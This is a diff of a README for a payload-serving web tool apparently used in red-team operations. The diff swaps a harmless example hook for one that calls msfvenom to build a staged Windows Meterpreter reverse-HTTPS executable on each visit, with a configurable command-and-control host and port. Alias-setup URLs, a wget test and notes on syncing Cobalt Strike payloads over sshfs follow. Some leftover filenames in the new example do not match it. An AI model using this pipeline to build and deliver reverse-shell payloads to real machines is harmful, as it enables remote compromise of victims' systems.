@@ -88,58 +88,60 @@ Beware that *(time-to-generate) > (TCP-timeout) = True* for some tools...
 This hook logs a `HTTP-Method User-Agent URL` for each request. Mostly a proof of concept for stats and measurements.
 
 
-### Breaking down the `hooks/serve_random.py` hook:
+### Breaking down the `hooks/autogen_msf.py` hook:
 ```python
 '''
-This hook serves random data when a certain filename is requested
-Serves as Hook Coding Example/Template. No Practical use...
+This hook serves a Meterpreter staged Reverse HTTPS
+iteration, created with msfvenom for each new visit
+of the triggering URL.
 '''
 import hooker
-from wormnest.utils import check_filename_for_hook
-import os, sys
+import subprocess
 import tempfile
 
-@hooker.hook("on_request")  # <-- This declares a hook when a GET request is made
-def serve_random(filename, request, retval={}):
-'''
-filename: The filename that is registered as returned file. Most of the time non-existent
-request: The Flask Request object that triggered the hook
-retval: Hooker reserved dict. The return value is expected in the 'fd' key.
-'''
-  # Standard code, checks if the requested filename contains this function's name before the last dot.
-  # This is used as sign to trigger the rest of the code.
-	func_name = sys._getframe().f_code.co_name
-	if not check_filename_for_hook(filename, func_name):
-		return None
+MSFVENOM = "msfvenom"    # msfvenom path
+C2_HOST = "127.0.0.1"    # Returns to localhost: Change this!
+C2_PORT = 443
 
-  # A Temporary File is created - read only
-	fd = tempfile.NamedTemporaryFile('rb')
-	generated_file = fd.name
+# Staged MetHTTPS
+PAYLOAD = "windows/meterpreter/reverse_https"    
 
-  # A 'dd' command to get random data populated in the file
-	command = "dd if=/dev/urandom of={} count=128".format(generated_file)
-	print("[!] '{}'".format(command))
-	os.system(command)
+# Triggered if the served filename contains the below string:
+#   Example: rev_https.msf.exe
+trigger_filename = '.msf'
 
-  # The file is returned using the 'hookers' interface
-	retval['fd'] = fd
-  # Irrelevant
-	return fd
+@hooker.hook("pre_file")
+def autogen_msf(filename, request):
+    if trigger_filename not in filename:
+        return None
+
+    extension = '.' + filename.split('.')[-1]
+    fd = tempfile.NamedTemporaryFile('rb', suffix=extension)
+
+    command = f"{MSFVENOM} -p {PAYLOAD} LHOST={C2_HOST} LPORT={C2_PORT} -f exe -o {fd.name}"
+    print("[!] '{}'".format(command))
+    try:
+        subprocess.run(command, shell=True, check=True)
+    except subprocess.CalledProcessError:
+        print(f"Failed to execute command: '{command}'")
+    return fd
 ```
-Loading it and running is easy as `HOOK_SCRIPTS=hooks/serve_random.py python3 app.py`.
+Loading it and running is as easy as `HOOK_SCRIPTS=hooks/autogen_msf.py python3 app.py`.
 Now, to trigger the hook we need a file with `serve_random` in its filename to be aliased. So:
 ```
-http://wormnest:8080/manage/add?path=hook.serve_random.dat&alias=hooktest
+http://wormnest:8080/manage/add?path=hook.serve_random.dat&alias=msf
 ```
-But this returns an error, about non-existing `hook.serve_random.dat` file.
+But this returns an error, about non-existing `rev_https.msf.exe` file.
 That's why `unchecked` exists:
 ```
-http://wormnest:8080/manage/add?path=hook.serve_random.dat&alias=hooktest&unchecked=true
+http://wormnest:8080/manage/add?path=rev_https.msf.exe&alias=msf&unchecked=true
 ```
-Now `http://wormnest:8080/hooktest` is accessible, and will return a file with random contents (on each request).
-Test it with `wget http://wormnest:8080/hooktest`!
+Now `http://wormnest:8080/msf` is accessible, and will return a Meterpreter EXE!
+Test it with `wget http://wormnest:8080/msf`!
 
-And in case you need something more useful, check the `hooks/autogen_msf.py`. Or the *Random File Picker hook* in `hooks/random_from_directory.py`. And you can always code your own hooks...
+
+Meterpreter is a little old fashioned?
+You can always code your own hooks...
 
 ----
 
@@ -170,7 +172,7 @@ Generating payloads from the CS client directly to the (remote) *Worm Nest* depl
 
 A simple:
 ```bash
-mkidr -p ~/cs_payloads
+mkdir -p ~/cs_payloads
 sshfs user@payloadserver:/place/where/wormnest/SRV_DIR/points ~/cs_payloads
 ```
 and then you can drop *artifacts* in `cs_payloads` directory and list them under `http://payloadserver:8000/manage/list`, ready for aliasing and serving!
